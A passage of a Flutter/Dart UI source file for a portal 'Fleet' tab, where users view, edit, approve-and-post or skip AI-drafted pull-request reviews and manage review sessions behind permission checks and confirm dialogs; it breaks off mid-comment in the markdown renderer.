import 'package:fixnum/fixnum.dart';
import 'package:flutter/material.dart';
import 'package:flutter_markdown/flutter_markdown.dart';
import 'package:grpc/grpc.dart' show GrpcError;

import '../auth/capabilities.dart';
import '../clients.dart';
import '../gen/agent/v1/forge_registry.pb.dart';
import '../gen/agent/v1/review_fleet.pb.dart';
import '../theme/seddon_colors.dart';
import 'fleet_session_dialog.dart';

/// The **Fleet** tab: view, trigger, and act on the review-fleet's PR review
/// drafts (review-fleet C14), plus light roster control. Talks to the full
/// `--serve-fleet` process (`:50086`) — the only one that wires the orchestrator
/// (`ReviewNow`), the approver (`Approve`), and the persisted history the review
/// RPCs read (`ListReviews`/`GetReview`).
///
/// Two panes: a left master list of review drafts — the **Inbox** of drafts
/// awaiting a decision, or the read-only **History** of finished ones —
/// filterable by repo/status,
/// with a collapsible **Sessions** strip above it (create/edit/delete,
/// enable/disable, "Review now"); and a right detail pane that renders the selected draft's markdown
/// body and offers **Approve & post** (the only outward-facing action, gated
/// behind a confirm dialog). Editing the body is increment 4.
///
/// Controls follow the signed-in user's permissions ([CapabilityScope],
/// security-hardening S13b): Approve needs `approve:review`, editing a draft
/// `write:review`, Review now `trigger:fleet`, creating/editing/enabling a
/// session `write:fleet`, deleting one `delete:fleet`.
///
/// A session reaches its forge through a **forge card** (`forge_id`, forge-auth
/// F5d2) — typically one the Forges tab made for a GitHub App install. The cards
/// are listed from the gateway's `ForgeRegistryService`, best-effort: without
/// them the strip still works, but a new session can't be created.
/// Hidden controls are a courtesy; the agent refuses the call regardless.
class FleetPage extends StatefulWidget {
  final PortalClients clients;

  /// The signed-in tenant, which owns the sessions this tab creates (a row's
  /// `user`); null when sign-in is off.
  final String? Function()? tenant;
  const FleetPage({super.key, required this.clients, this.tenant});

  @override
  State<FleetPage> createState() => _FleetPageState();
}

/// Which drafts the list shows. The **Inbox** (the default) holds the drafts
/// that still need a decision: `drafted`, and `approved` (an approval whose
/// post failed). **History** holds the finished ones — `posted`, `skipped`,
/// `superseded` — read-only.
enum _View { inbox, history }

extension on _View {
  String get label => switch (this) {
        _View.inbox => 'Inbox',
        _View.history => 'History',
      };

  /// The wire `exclude_status`: everything the other view holds.
  List<String> get exclude => switch (this) {
        _View.inbox => const ['posted', 'superseded', 'skipped'],
        _View.history => const ['drafted', 'approved'],
      };

  /// The statuses the status menu offers ('' = all of this view's).
  List<String> get statuses => switch (this) {
        _View.inbox => const ['', 'drafted', 'approved'],
        _View.history => const ['', 'posted', 'skipped', 'superseded'],
      };

  String get allLabel => switch (this) {
        _View.inbox => 'all open',
        _View.history => 'all finished',
      };
}

/// The most ids one SkipReviews call takes (`agent_core::MAX_SKIP_BATCH`).
const _skipBatch = 500;

/// The server's row cap on a listing (`MAX_DRAFT_ROWS`); a list this long may
/// have been cut short.
const _listCap = 500;

/// A bulk skip's outcome counts as one line, e.g. "12 skipped, 1 already
/// posted". An unknown status is shown as the server sent it.
String _skipSummary(Map<String, int> counts) {
  const order = ['skipped', 'already_skipped', 'already_posted', 'not_found'];
  final keys = [
    ...order.where(counts.containsKey),
    ...(counts.keys.where((k) => !order.contains(k)).toList()..sort()),
  ];
  if (keys.isEmpty) return 'Nothing skipped.';
  return keys.map((k) => '${counts[k]} ${k.replaceAll('_', ' ')}').join(', ');
}

/// A roster repo key (`owner__name`) as people write it.
String _repoLabel(String key) => key.replaceFirst('__', '/');

class _FleetPageState extends State<FleetPage> {
  // The repo filter: a roster repo key, or '' for every repo.
  String _repo = '';
  // Every repo seen in the roster or a listing, so the dropdown keeps its
  // choices while one repo is selected.
  final Set<String> _knownRepos = {};
  _View _view = _View.inbox;
  // The status filter within the view: one of `_view.statuses`, '' for all.
  String _status = '';

  List<ReviewSummary> _reviews = [];
  List<FleetSession> _sessions = [];
  // Forge cards for the session editor; null when they could not be listed.
  List<ForgeCard>? _cards;
  String? _cardsError;
  ReviewSummary? _selected;
  bool _loading = true;
  String? _error;
  bool _showSessions = false;
  // A Skip all is in flight: its button is disabled, so a second can't start.
  bool _skippingAll = false;

  @override
  void initState() {
    super.initState();
    _reload();
  }

  Future<void> _reload() async {
    setState(() {
      _loading = true;
      _error = null;
    });
    try {
      final req = ListReviewsRequest()
        ..repo = _repo
        ..status = _status
        ..excludeStatus.addAll(_view.exclude)
        ..limit = 0; // 0 ⇒ the server's row cap
      // Roster + drafts in parallel; roster is best-effort (the strip is
      // secondary), so a roster failure doesn't blank the drafts list.
      final reviewsF = widget.clients.fleet.listReviews(req);
      final sessionsF = widget.clients.fleet
          .list(FleetListRequest())
          .then((r) => r.sessions.toList())
          .catchError((_) => <FleetSession>[]);
      // Forge cards come from the gateway, not the fleet process; also
      // best-effort (a reviewer may not hold `read:forge_registry`).
      String? cardsError;
      final cardsF = widget.clients.forges
          .list(ForgeListRequest())
          .then<List<ForgeCard>?>((r) => r.forges.toList()..sort((a, b) => a.id.compareTo(b.id)))
          .catchError((Object e) {
        cardsError = e is GrpcError ? (e.message ?? e.codeName) : 'unreachable';
        return null;
      });
      final reviews = (await reviewsF).reviews.toList();
      final sessions = await sessionsF;
      final cards = await cardsF;
      if (!mounted) return;
      setState(() {
        _reviews = reviews;
        _sessions = sessions;
        _knownRepos
          ..addAll(sessions.map((s) => s.repo))
          ..addAll(reviews.map((r) => r.repo))
          ..removeWhere((r) => r.isEmpty);
        _cards = cards;
        _cardsError = cardsError;
        // Re-select by id so an action keeps the detail pane in place.
        final selId = _selected?.reviewId;
        _selected = selId == null
            ? null
            : _reviews.where((r) => r.reviewId == selId).firstOrNull;
        _loading = false;
      });
    } catch (e) {
      if (!mounted) return;
      setState(() {
        _error = '$e';
        _loading = false;
      });
    }
  }

  void _snack(String msg) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(msg)));
  }

  Future<void> _toggleEnable(FleetSession s, bool enabled) async {
    try {
      await widget.clients.fleet.setEnabled(
        FleetSetEnabledRequest()
          ..id = s.id
          ..enabled = enabled,
      );
      _snack('${s.id} ${enabled ? "enabled" : "disabled"}.');
      await _reload();
    } catch (e) {
      _snack('Enable failed: $e');
    }
  }

  /// Create (no [base]) or edit a session, then `Put` it.
  Future<void> _editSession([FleetSession? base]) async {
    final row = await showDialog<FleetSession>(
      context: context,
      builder: (ctx) => FleetSessionDialog(
        base: base,
        cards: _cards,
        cardsError: _cardsError,
        takenIds: {for (final s in _sessions) s.id},
        tenant: widget.tenant?.call(),
      ),
    );
    if (row == null) return;
    try {
      final saved = await widget.clients.fleet.put(row);
      _snack('Session ${saved.id.isEmpty ? row.id : saved.id} saved.');
      await _reload();
    } on GrpcError catch (e) {
      _snack('Save failed: ${e.message ?? e.codeName}');
    }
  }

  Future<void> _deleteSession(FleetSession s) async {
    final ok = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: Text('Delete session "${s.id}"?'),
        content: const Text('The fleet stops reviewing this repository. Its '
            'review drafts stay listed.'),
        actions: [
          TextButton(
            key: const Key('fleet.session.delete.cancel'),
            onPressed: () => Navigator.pop(ctx, false),
            child: const Text('Cancel'),
          ),
          FilledButton(
            key: const Key('fleet.session.delete.confirm'),
            onPressed: () => Navigator.pop(ctx, true),
            child: const Text('Delete'),
          ),
        ],
      ),
    );
    if (ok != true) return;
    try {
      final reply =
          await widget.clients.fleet.delete(FleetSessionRef()..id = s.id);
      _snack(reply.deleted ? '${s.id} deleted.' : '${s.id} was already gone.');
      await _reload();
    } on GrpcError catch (e) {
      _snack('Delete failed: ${e.message ?? e.codeName}');
    }
  }

  Future<void> _reviewNow(FleetSession s) async {
    final controller = TextEditingController();
    final prText = await showDialog<String>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: Text('Review now — ${s.id}'),
        content: TextField(
          key: const Key('fleet.reviewNow.prNumber'),
          controller: controller,
          autofocus: true,
          keyboardType: TextInputType.number,
          decoration: const InputDecoration(
            labelText: 'PR number',
            helperText: 'Queue a review of this PR now',
            border: OutlineInputBorder(),
          ),
          onSubmitted: (v) => Navigator.pop(ctx, v),
        ),
        actions: [
          TextButton(
            key: const Key('fleet.reviewNow.cancel'),
            onPressed: () => Navigator.pop(ctx),
            child: const Text('Cancel'),
          ),
          FilledButton(
            key: const Key('fleet.reviewNow.queue'),
            onPressed: () => Navigator.pop(ctx, controller.text),
            child: const Text('Queue'),
          ),
        ],
      ),
    );
    controller.dispose();
    final pr = int.tryParse((prText ?? '').trim());
    if (pr == null || pr <= 0) return;
    try {
      final reply = await widget.clients.fleet.reviewNow(
        ReviewNowRequest()
          ..sessionId = s.id
          ..prNumber = Int64(pr),
      );
      _snack(reply.accepted
          ? 'Queued review of PR #$pr on ${s.id}.'
          : 'PR #$pr already pending/in-flight — coalesced.');
      await _reload();
    } catch (e) {
      _snack('Review now failed: $e');
    }
  }

  Future<void> _approve(ReviewSummary r) async {
    final ok = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: Text('Approve & post review of PR #${r.prNumber}?'),
        content: const Text(
          'This posts the review to the forge. This is outward-facing and '
          'cannot be taken back.',
        ),
        actions: [
          TextButton(
            key: const Key('fleet.approve.cancel'),
            onPressed: () => Navigator.pop(ctx, false),
            child: const Text('Cancel'),
          ),
          FilledButton(
            key: const Key('fleet.approve.confirm'),
            onPressed: () => Navigator.pop(ctx, true),
            child: const Text('Approve & post'),
          ),
        ],
      ),
    );
    if (ok != true) return;
    try {
      final reply = await widget.clients.fleet.approve(
        ApproveRequest()..reviewId = r.reviewId,
      );
      switch (reply.status) {
        case 'posted':
          _snack('Posted${reply.detail.isEmpty ? "" : ": ${reply.detail}"}');
        case 'already_posted':
          _snack('Already posted.');
        case 'not_found':
          _snack('Draft not found (superseded?).');
        case 'skipped':
          _snack('This draft was skipped; nothing posted.');
        default:
          _snack('Approve: ${reply.status}');
      }
      await _reload();
    } catch (e) {
      _snack('Approve failed: $e');
    }
  }

  /// Skip a draft: it is never posted and moves to History.
  Future<void> _skip(ReviewSummary r) async {
    final ok = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: Text('Skip review of PR #${r.prNumber}?'),
        content: const Text(
          'The draft is never posted, and moves to History. A new commit on '
          'the PR gets a fresh review.',
        ),
        actions: [
          TextButton(
            key: const Key('fleet.skip.cancel'),
            onPressed: () => Navigator.pop(ctx, false),
            child: const Text('Cancel'),
          ),
          FilledButton(
            key: const Key('fleet.skip.confirm'),
            onPressed: () => Navigator.pop(ctx, true),
            child: const Text('Skip'),
          ),
        ],
      ),
    );
    if (ok != true) return;
    try {
      final reply = await widget.clients.fleet.skipReview(
        SkipReviewRequest()..reviewId = r.reviewId,
      );
      switch (reply.status) {
        case 'skipped':
          _snack('Skipped PR #${r.prNumber}.');
        case 'already_skipped':
          _snack('Already skipped.');
        case 'already_posted':
          _snack('Already posted; nothing to skip.');
        case 'not_found':
          _snack('Draft not found.');
        default:
          _snack('Skip: ${reply.status}');
      }
      await _reload();
    } catch (e) {
      _snack('Skip failed: $e');
    }
  }

  /// Skip every draft the Inbox shows. The ids are the ones on screen when the
  /// button is pressed — a draft that arrives later is never skipped by it.
  Future<void> _skipAll() async {
    final ids = [for (final r in _reviews) r.reviewId];
    if (ids.isEmpty) return;
    final where = _repo.isEmpty ? 'across all repos' : 'in ${_repoLabel(_repo)}';
    // A full listing may have older drafts behind it, which this can't reach.
    final capped = _reviews.length >= _listCap;
    final ok = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: Text('Skip all ${ids.length} shown drafts?'),
        content: Text(
          'The ${ids.length} drafts listed $where are never posted. They move '
          'to History. A new commit on a PR gets a fresh review.'
          '${capped ? '\n\nOnly the newest $_listCap are listed. Older drafts '
              'stay in the Inbox; press Skip all again for them.' : ''}',
          key: const Key('fleet.skipAll.body'),
        ),
        actions: [
          TextButton(
            key: const Key('fleet.skipAll.cancel'),
            onPressed: () => Navigator.pop(ctx, false),
            child: const Text('Cancel'),
          ),
          FilledButton(
            key: const Key('fleet.skipAll.confirm'),
            onPressed: () => Navigator.pop(ctx, true),
            child: const Text('Skip all'),
          ),
        ],
      ),
    );
    if (ok != true || _skippingAll) return;
    setState(() => _skippingAll = true);
    final counts = <String, int>{};
    try {
      // Today this runs once: a listing is at most `MAX_DRAFT_ROWS`, which
      // agent-core asserts is <= `MAX_SKIP_BATCH`. It batches anyway, so the
      // page stays correct if the two caps ever diverge.
      for (var i = 0; i < ids.length; i += _skipBatch) {
        final reply = await widget.clients.fleet.skipReviews(
          SkipReviewsRequest()
            ..reviewIds.addAll(ids.skip(i).take(_skipBatch)),
        );
        for (final r in reply.results) {
          counts[r.status] = (counts[r.status] ?? 0) + 1;
        }
      }
      _snack(_skipSummary(counts));
    } catch (e) {
      _snack('Skip all failed: $e'
          '${counts.isEmpty ? "" : " (after ${_skipSummary(counts)})"}');
    } finally {
      if (mounted) setState(() => _skippingAll = false);
    }
    await _reload();
  }

  @override
  Widget build(BuildContext context) {
    final theme = Theme.of(context);
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        // Filter bar.
        Material(
          color: theme.colorScheme.surfaceContainerHighest,
          child: Padding(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
            // A Wrap, not a Row: on a narrow window the filters move to a
            // second line instead of clipping off the edge.
            child: Wrap(
              spacing: 12,
              runSpacing: 4,
              crossAxisAlignment: WrapCrossAlignment.center,
              children: [
                const Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(Icons.rate_review_outlined, size: 18),
                    SizedBox(width: 8),
                    Text('Review drafts',
                        style: TextStyle(fontWeight: FontWeight.bold)),
                  ],
                ),
                // Fixed width: a long owner/name ellipsizes rather than
                // widening the bar.
                SizedBox(
                  width: 260,
                  child: DropdownButton<String>(
                    key: const Key('fleet.filter.repo'),
                    isExpanded: true,
                    value: _repo,
                    items: [
                      const DropdownMenuItem(
                          value: '', child: Text('all repos')),
                      for (final r in ({
                        ..._knownRepos,
                        if (_repo.isNotEmpty) _repo
                      }.toList()
                        ..sort()))
                        DropdownMenuItem(
                            value: r,
                            child: Text(_repoLabel(r),
                                overflow: TextOverflow.ellipsis)),
                    ],
                    onChanged: (v) {
                      if (v == null) return;
                      setState(() => _repo = v);
                      _reload();
                    },
                  ),
                ),
                SegmentedButton<_View>(
                  key: const Key('fleet.view'),
                  segments: [
                    for (final v in _View.values)
                      ButtonSegment(value: v, label: Text(v.label)),
                  ],
                  selected: {_view},
                  showSelectedIcon: false,
                  onSelectionChanged: (s) {
                    if (s.first == _view) return;
                    setState(() {
                      _view = s.first;
                      _status = '';
                      _selected = null;
                    });
                    _reload();
                  },
                ),
                DropdownButton<String>(
                  key: const Key('fleet.filter.status'),
                  value: _status,
                  items: [
                    for (final s in _view.statuses)
                      DropdownMenuItem(
                        value: s,
                        child: Text(s.isEmpty ? _view.allLabel : s),
                      ),
                  ],
                  onChanged: (v) {
                    if (v == null) return;
                    setState(() => _status = v);
                    _reload();
                  },
                ),
                OutlinedButton.icon(
                  key: const Key('fleet.filter.refresh'),
                  onPressed: _reload,
                  icon: const Icon(Icons.refresh, size: 18),
                  label: const Text('Refresh'),
                ),
                // Clear the Inbox in one go: skips exactly the drafts listed.
                if (_view == _View.inbox &&
                    !_loading &&
                    _error == null &&
                    _reviews.isNotEmpty &&
                    CapabilityScope.of(context).can('approve', 'review'))
                  OutlinedButton.icon(
                    key: const Key('fleet.skipAll'),
                    onPressed: _skippingAll ? null : _skipAll,
                    icon: const Icon(Icons.block, size: 18),
                    label: Text('Skip all ${_reviews.length} shown'),
                  ),
              ],
            ),
          ),
        ),
        const Divider(height: 1),
        Expanded(child: _body()),
      ],
    );
  }

  Widget _body() {
    if (_loading) return const Center(child: CircularProgressIndicator());
    if (_error != null) {
      return _OfflineRetry(
          key: const Key('fleet.error.retry'),
          message: _error!,
          onRetry: _reload);
    }
    return Row(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        SizedBox(width: 360, child: _leftColumn()),
        const VerticalDivider(width: 1),
        Expanded(
          child: _selected == null
              ? const Center(child: Text('Select a review draft'))
              : _DraftDetail(
                  key: ValueKey(_selected!.reviewId),
                  clients: widget.clients,
                  summary: _selected!,
                  readOnly: _view == _View.history,
                  onApprove: () => _approve(_selected!),
                  onSkip: () => _skip(_selected!),
                ),
        ),
      ],
    );
  }

  Widget _leftColumn() {
    return Column(
      children: [
        _sessionsStrip(),
        const Divider(height: 1),
        // The listing stops at the server's row cap; say so rather than let a
        // full page pass for everything.
        if (_reviews.length >= _listCap)
          Padding(
            key: const Key('fleet.list.capped'),
            padding: const EdgeInsets.fromLTRB(16, 6, 16, 6),
            child: Text('Showing the newest $_listCap.',
                style: Theme.of(context).textTheme.bodySmall),
          ),
        Expanded(
          child: _reviews.isEmpty
              ? Center(
                  child: Padding(
                    padding: const EdgeInsets.all(16),
                    child: Text(
                        _status.isNotEmpty
                            ? 'No review drafts match.'
                            : _view == _View.inbox
                                ? 'Inbox empty: no drafts await a decision.'
                                : 'No finished drafts yet.',
                        textAlign: TextAlign.center),
                  ),
                )
              : ListView.builder(
                  itemCount: _reviews.length,
                  itemBuilder: (ctx, i) {
                    final r = _reviews[i];
                    return ListTile(
                      key: Key('fleet.review.item.${r.reviewId}'),
                      selected: _selected?.reviewId == r.reviewId,
                      dense: SeddonColors.of(context).denseLists,
                      title: Text('PR #${r.prNumber} · ${r.repo}',
                          maxLines: 1, overflow: TextOverflow.ellipsis),
                      subtitle: Text(
                        'risk ${r.riskScore.toStringAsFixed(2)}'
                        '${r.gateFailed ? " · gate failed" : ""}'
                        ' · ${r.nFindings} static-analysis findings',
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis,
                      ),
                      leading: _statusChip(r.status),
                      onTap: () => setState(() => _selected = r),
                    );
                  },
                ),
        ),
      ],
    );
  }

  Widget _sessionsStrip() {
    final caps = CapabilityScope.of(context);
    return ExpansionTile(
      initiallyExpanded: _showSessions,
      onExpansionChanged: (v) => setState(() => _showSessions = v),
      leading: const Icon(Icons.dns_outlined),
      title: Text('Sessions (${_sessions.length})',
          style: const TextStyle(fontWeight: FontWeight.bold)),
      childrenPadding: EdgeInsets.zero,
      children: [
        if (caps.can('write', 'fleet'))
          Align(
            alignment: Alignment.centerLeft,
            child: Padding(
              padding: const EdgeInsets.symmetric(horizontal: 8),
              child: TextButton.icon(
                key: const Key('fleet.session.new'),
                onPressed: () => _editSession(),
                icon: const Icon(Icons.add, size: 18),
                label: const Text('New session'),
              ),
            ),
          ),
        if (_sessions.isEmpty)
          ListTile(
            dense: SeddonColors.of(context).denseLists,
            title: const Text('No roster sessions.'),
          ),
        ..._sessions.map((s) => ListTile(
                    key: Key('fleet.session.item.${s.id}'),
                    dense: SeddonColors.of(context).denseLists,
                    title: Text(s.id,
                        maxLines: 1, overflow: TextOverflow.ellipsis),
                    subtitle: Text(
                        s.forgeId.isEmpty ? s.repo : '${s.repo} · ${s.forgeId}',
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis),
                    trailing: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        if (caps.can('trigger', 'fleet'))
                          IconButton(
                            key: Key('fleet.session.reviewNow.${s.id}'),
                            icon: const Icon(Icons.play_circle_outline),
                            tooltip: 'Review now',
                            visualDensity: VisualDensity.compact,
                            onPressed: () => _reviewNow(s),
                          ),
                        if (caps.can('write', 'fleet'))
                          IconButton(
                            key: Key('fleet.session.edit.${s.id}'),
                            icon: const Icon(Icons.edit_outlined),
                            tooltip: 'Edit',
                            visualDensity: VisualDensity.compact,
                            onPressed: () => _editSession(s),
                          ),
                        if (caps.can('delete', 'fleet'))
                          IconButton(
                            key: Key('fleet.session.delete.${s.id}'),
                            icon: const Icon(Icons.delete_outline),
                            tooltip: 'Delete',
                            visualDensity: VisualDensity.compact,
                            onPressed: () => _deleteSession(s),
                          ),
                        Switch(
                          key: Key('fleet.session.enable.${s.id}'),
                          value: s.enabled,
                          onChanged: caps.can('write', 'fleet')
                              ? (v) => _toggleEnable(s, v)
                              : null,
                        ),
                      ],
                    ),
                  )),
      ],
    );
  }

  /// A review's status as a distinct icon shape (never colour alone,
  /// visual/08-accessibility.md), plus its name as text when the theme asks
  /// for `status_icons`.
  Widget _statusChip(String status) {
    final c = SeddonColors.of(context);
    final (icon, color) = switch (status) {
      'posted' => (Icons.upload, c.success),
      'approved' => (Icons.check_circle_outline, c.info),
      'superseded' => (Icons.remove_circle_outline, c.muted),
      'skipped' => (Icons.block, c.muted),
      _ => (Icons.edit_note, c.warning), // drafted
    };
    final glyph = Icon(icon, size: 18, color: color, semanticLabel: status);
    return Tooltip(
      message: status,
      child: c.statusIcons
          ? Row(mainAxisSize: MainAxisSize.min, children: [
              glyph,
              const SizedBox(width: 4),
              ExcludeSemantics(child: Text(status, style: TextStyle(color: color))),
            ])
          : glyph,
    );
  }
}

/// The detail pane's mode: the rendered read view, a raw-markdown editor, or a
/// live preview of the edit buffer (GitHub-style edit/preview).
enum _DetailMode { view, edit, preview }

/// The right detail pane: fetches the selected draft's body (GetReview) and
/// renders it as markdown, with an Edit/Preview toggle (Save → UpdateReview) and
/// an Approve & post action. Keyed by review_id so selecting a different draft
/// rebuilds it fresh. A `posted`/`approved` draft is locked — editing is
/// disabled and the server would reject a write anyway (UpdateReview → locked).
class _DraftDetail extends StatefulWidget {
  final PortalClients clients;
  final ReviewSummary summary;

  /// History: the draft is shown, never edited, approved or skipped.
  final bool readOnly;
  final VoidCallback onApprove;
  final VoidCallback onSkip;
  const _DraftDetail({
    super.key,
    required this.clients,
    required this.summary,
    this.readOnly = false,
    required this.onApprove,
    required this.onSkip,
  });

  @override
  State<_DraftDetail> createState() => _DraftDetailState();
}

class _DraftDetailState extends State<_DraftDetail> {
  final _edit = TextEditingController();
  String? _body;
  bool _truncated = false;
  bool _loading = true;
  bool _saving = false;
  String? _error;
  // The draft is listed but has no readable body on this fleet instance — the
  // server answered NotFound (e.g. it belongs to a different fleet root). A clean
  // empty state, not a connectivity error.
  bool _unavailable = false;
  _DetailMode _mode = _DetailMode.view;

  /// A `posted`/`approved` draft can't be edited (matches the server's write
  /// gate — UpdateReview returns `locked`).
  bool get _locked =>
      widget.readOnly ||
      widget.summary.status == 'posted' ||
      widget.summary.status == 'approved' ||
      widget.summary.status == 'skipped' ||
      !CapabilityScope.of(context).can('write', 'review');

  /// The edit buffer differs from the persisted body.
  bool get _dirty => _edit.text != (_body ?? '');

  @override
  void initState() {
    super.initState();
    _fetch();
  }

  @override
  void dispose() {
    _edit.dispose();
    super.dispose();
  }

  void _snack(String msg) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(msg)));
  }

  Future<void> _fetch() async {
    setState(() {
      _loading = true;
      _error = null;
      _unavailable = false;
    });
    try {
      final reply = await widget.clients.fleet.getReview(
        GetReviewRequest()..reviewId = widget.summary.reviewId,
      );
      if (!mounted) return;
      setState(() {
        _body = reply.body;
        _edit.text = reply.body; // keep the edit buffer in sync with disk
        _truncated = reply.truncated;
        _loading = false;
      });
    } catch (e) {
      if (!mounted) return;
      // A draft with no readable body here (e.g. one minted under a different
      // fleet root, still listed by ListReviews) comes back as gRPC NotFound —
      // show the empty state, not the offline/retry panel.
      if (_grpcCode(e) == _grpcNotFound) {
        setState(() {
          _unavailable = true;
          _loading = false;
        });
        return;
      }
      setState(() {
        _error = '$e';
        _loading = false;
      });
    }
  }

  Future<void> _save() async {
    setState(() => _saving = true);
    try {
      final reply = await widget.clients.fleet.updateReview(
        UpdateReviewRequest()
          ..reviewId = widget.summary.reviewId
          ..body = _edit.text,
      );
      switch (reply.status) {
        case 'updated':
          _snack('Saved.');
          if (!mounted) return;
          setState(() => _mode = _DetailMode.view);
          await _fetch();
        case 'locked':
          _snack('Locked — this draft is posted/approved and can\'t be edited.');
          await _fetch();
        case 'not_found':
          _snack('Draft not found (superseded?).');
        default:
          _snack('Save: ${reply.status}');
      }
    } catch (e) {
      _snack('Save failed: $e');
    } finally {
      if (mounted) setState(() => _saving = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    final r = widget.summary;
    final posted = r.status == 'posted';
    final skipped = r.status == 'skipped';
    // History offers no actions at all.
    final canAct =
        !widget.readOnly && CapabilityScope.of(context).can('approve', 'review');
    // Approving posts the *persisted* body, so block it while there are unsaved
    // edits — the operator should Save first (edit → save → approve). Also block
    // when there's no readable body here (an unavailable/cross-root draft).
    final canApprove =
        !posted && !skipped && !_dirty && !_saving && !_unavailable;
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Padding(
          padding: const EdgeInsets.fromLTRB(16, 12, 16, 8),
          child: Row(
            children: [
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text('PR #${r.prNumber} · ${r.repo}',
                        style: Theme.of(context).textTheme.titleLarge),
                    Text(
                      '${r.status} · risk ${r.riskScore.toStringAsFixed(2)}'
                      '${r.gateFailed ? " · gate failed" : ""}'
                      ' · +${r.additions}/-${r.deletions} in ${r.filesChanged} files',
                      style: Theme.of(context).textTheme.bodySmall,
                    ),
                    // Who asked for and who approved it (security-hardening S19);
                    // a review the poller or Slack started has no requester.
                    if (r.requestedBy.isNotEmpty || r.approvedBy.isNotEmpty)
                      Text(
                        [
                          if (r.requestedBy.isNotEmpty)
                            'requested by ${r.requestedBy.join(", ")}',
                          if (r.approvedBy.isNotEmpty)
                            '${skipped ? "skipped" : "approved"} by ${r.approvedBy}',
                        ].join(' · '),
                        key: const Key('fleet.detail.attribution'),
                        maxLines: 2,
                        overflow: TextOverflow.ellipsis,
                        style: Theme.of(context).textTheme.bodySmall,
                      ),
                  ],
                ),
              ),
              const SizedBox(width: 12),
              // Skip: never post this draft. Not offered once it is posted or
              // already skipped.
              if (canAct && !posted && !skipped) ...[
                OutlinedButton.icon(
                  key: const Key('fleet.detail.skip'),
                  onPressed: _saving ? null : widget.onSkip,
                  icon: const Icon(Icons.block, size: 18),
                  label: const Text('Skip'),
                ),
                const SizedBox(width: 8),
              ],
              if (canAct)
                FilledButton.icon(
                  key: const Key('fleet.detail.approve'),
                  onPressed: canApprove ? widget.onApprove : null,
                  icon: const Icon(Icons.send, size: 18),
                  label: Text(posted
                      ? 'Posted'
                      : skipped
                          ? 'Skipped'
                          : 'Approve & post'),
                ),
            ],
          ),
        ),
        // Mode toggle + Save. A locked draft has no editor — view only. Hidden
        // when there's no readable body here (an unavailable/cross-root draft).
        if (!_loading && _error == null && !_unavailable)
          Padding(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 8),
            child: Row(
              children: [
                SegmentedButton<_DetailMode>(
                  key: const Key('fleet.detail.mode'),
                  segments: [
                    const ButtonSegment(
                      value: _DetailMode.view,
                      icon: Icon(Icons.visibility_outlined, size: 18),
                      label: Text('View'),
                    ),
                    ButtonSegment(
                      value: _DetailMode.edit,
                      icon: const Icon(Icons.edit_outlined, size: 18),
                      label: const Text('Edit'),
                      enabled: !_locked,
                    ),
                    ButtonSegment(
                      value: _DetailMode.preview,
                      icon: const Icon(Icons.article_outlined, size: 18),
                      label: const Text('Preview'),
                      enabled: !_locked,
                    ),
                  ],
                  selected: {_mode},
                  onSelectionChanged: (s) => setState(() => _mode = s.first),
                ),
                const Spacer(),
                if (_locked)
                  Text('read-only (${r.status})',
                      style: Theme.of(context).textTheme.bodySmall),
                if (!_locked && _mode != _DetailMode.view) ...[
                  if (_dirty)
                    Padding(
                      padding: const EdgeInsets.only(right: 8),
                      child: Text('unsaved',
                          style: TextStyle(
                              color: Theme.of(context).colorScheme.error)),
                    ),
                  FilledButton.tonalIcon(
                    key: const Key('fleet.detail.save'),
                    onPressed: (_dirty && !_saving) ? _save : null,
                    icon: _saving
                        ? const SizedBox(
                            width: 16,
                            height: 16,
                            child: CircularProgressIndicator(strokeWidth: 2))
                        : const Icon(Icons.save, size: 18),
                    label: const Text('Save'),
                  ),
                ],
              ],
            ),
          ),
        if (_truncated)
          Container(
            width: double.infinity,
            color: Theme.of(context).colorScheme.errorContainer,
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
            child: Text(
                'Body truncated at the server cap — saving would overwrite the '
                'full draft with this shortened copy. Do not save.',
                style: TextStyle(
                    color: Theme.of(context).colorScheme.onErrorContainer)),
          ),
        const Divider(height: 1),
        Expanded(child: _content()),
      ],
    );
  }

  Widget _content() {
    if (_loading) return const Center(child: CircularProgressIndicator());
    if (_error != null) {
      return _OfflineRetry(
          key: const Key('fleet.detail.retry'),
          message: _error!,
          onRetry: _fetch);
    }
    if (_unavailable) {
      return const Center(
        child: Padding(
          padding: EdgeInsets.all(24),
          child: Text(
            'No stored body for this draft on this fleet instance.\n'
            'It may belong to a different fleet root (an earlier run).',
            textAlign: TextAlign.center,
          ),
        ),
      );
    }
    switch (_mode) {
      case _DetailMode.edit:
        return Padding(
          padding: const EdgeInsets.all(16),
          child: TextField(
            key: const Key('fleet.detail.editor'),
            controller: _edit,
            maxLines: null,
            expands: true,
            textAlignVertical: TextAlignVertical.top,
            keyboardType: TextInputType.multiline,
            style: SeddonColors.of(context).mono.copyWith(fontSize: SeddonColors.of(context).sp(13)),
            decoration: const InputDecoration(
              border: OutlineInputBorder(),
              alignLabelWithHint: true,
              hintText: 'Draft markdown…',
            ),
            // Refresh the dirty/Save state as the operator types.
            onChanged: (_) => setState(() {}),
          ),
        );
      case _DetailMode.preview:
        return _markdown(_edit.text);
      case _DetailMode.view:
        return _markdown(_body ?? '');
    }
  }

  Widget _markdown(String body) {
    if (body.isEmpty) {
      return const Center(child: Text('Empty draft body.'));
    }
    // Security: the draft body is model-authored from an untrusted PR (CLAUDE.md
